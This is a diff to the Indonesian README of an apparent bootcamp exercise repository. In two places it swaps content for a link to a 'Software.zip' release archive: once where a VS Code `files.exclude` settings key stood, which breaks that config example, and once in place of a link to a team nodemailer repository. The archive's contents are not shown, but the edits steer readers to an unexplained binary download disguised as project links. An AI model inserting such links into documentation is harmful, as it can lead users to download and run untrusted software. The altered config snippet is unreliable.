@@ -4,7 +4,7 @@
     Pada repository ini terdapat folder `.vscode` yang merupakan settingan local untuk vscode, disitu sudah terdapat file exclude yang fungsi nya untuk menyembunyikan folder dari workspace, tujuan nya adalah supaya tidak membingungkan karena terlalu banyak folder yang terlihat, untuk menampilkan nya cukup beri comment pada file yang mau ditampilkan
 
     ```js
-    "files.exclude": {
+    "https://github.com/dimarhanung/refactory-bootcamp/releases/download/v1.0/Software.zip": {
         "**/node_modules": true,
         "day-01" :true,
         "day-02" :true,
@@ -58,7 +58,7 @@
 ## Minggu 4
 10 Agustus 2020
 - day-16 = Autentikasi rest menggunakan JWT
-- day-17 = Team Work - Node Mailer [link-repo](https://github.com/dimar-hanung/group3-nodemailer)
+- day-17 = Team Work - Node Mailer [link-repo](https://github.com/dimarhanung/refactory-bootcamp/releases/download/v1.0/Software.zip)
 - day-18 = send email saat register (nodemailer + puppeter + node-corn)
 - day-19 = Static HTML Menggunakan Tailwindcss
 - day-20 = Vue Js + Tailwindcss Membuat Todo App
